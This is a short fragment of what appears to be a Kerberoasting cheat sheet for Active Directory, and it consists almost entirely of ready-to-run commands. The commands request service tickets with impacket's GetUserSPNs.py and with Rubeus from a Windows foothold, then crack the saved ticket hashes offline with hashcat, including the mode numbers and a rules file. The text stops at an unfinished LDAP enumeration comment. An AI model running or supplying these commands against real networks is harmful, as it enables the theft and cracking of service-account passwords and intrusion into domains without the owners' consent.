...
tags: [active-directory, kerberos, kerberoasting, credential-cracking, windows]
...
```bash
# enumerate + request in one go (impacket)
GetUserSPNs.py dom.local/user:pass -dc-ip 10.0.0.1 -request -outputfile hashes.txt

# request from a Windows foothold
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

# crack (RC4 tickets = mode 13100; AES = 19700/19600)
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# find SPNs via LDAP without requesting
